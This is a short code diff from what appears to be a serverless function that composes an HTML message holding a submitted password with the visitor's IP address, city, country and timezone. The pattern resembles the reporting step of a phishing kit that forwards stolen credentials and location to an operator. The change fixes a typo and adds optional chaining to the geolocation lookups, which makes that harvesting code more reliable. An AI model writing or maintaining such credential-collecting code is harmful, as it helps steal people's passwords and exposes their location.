@@ -28,9 +28,9 @@ export default async (req: Request, context: Context) => {
             Password:: ${password} <br/><br/>
             Geolocation:
             IP:: ${context.ip} <br/>
-            City:: ${context.geo.city} <br/>
-            Country:: ${context.geo.country} <br/>
-            Timezone:: ${context,geo.timezone} <br/>
+            City:: ${context?.geo?.city} <br/>
+            Country:: ${context?.geo?.country} <br/>
+            Timezone:: ${context?.geo?.timezone} <br/>
             </p>`,
     };
 
